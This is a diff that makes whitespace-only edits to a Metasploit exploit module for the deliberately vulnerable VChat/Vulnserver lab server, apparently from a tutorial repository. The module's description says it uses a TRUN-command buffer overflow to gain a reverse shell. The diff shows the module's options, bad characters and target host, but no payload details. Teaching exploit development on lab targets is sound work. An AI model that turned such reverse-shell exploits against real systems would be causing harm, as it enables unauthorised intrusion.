@@ -18,7 +18,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
     super(update_info(info,
       'Name'           => 'VChat/Vulnserver Buffer Overflow-TRUN command',	# Name of the target
       'Description'    => %q{	# Explaining what the module does
-         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
+         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell.
       },
       'Author'         => [ 'fxw' ],	## Hacker name
       'License'        => MSF_LICENSE,
@@ -26,13 +26,12 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
         [
           #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
           [ 'URL', 'https://github.com/DaintyJet/VChat_ROP_INTRO' ]
-
         ],
       'Privileged'     => false,
       'DefaultOptions' =>
         {
-          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
-        },      
+          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done
+        },
       'Payload'        =>	# How to encode and generate the payload
         {
           'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
@@ -55,7 +54,6 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
           Opt::RHOSTS('192.168.7.191'),
       ])
   end
-
   def exploit	# Actual exploit
     print_status("Connecting to target...")
     connect	# Connect to the target
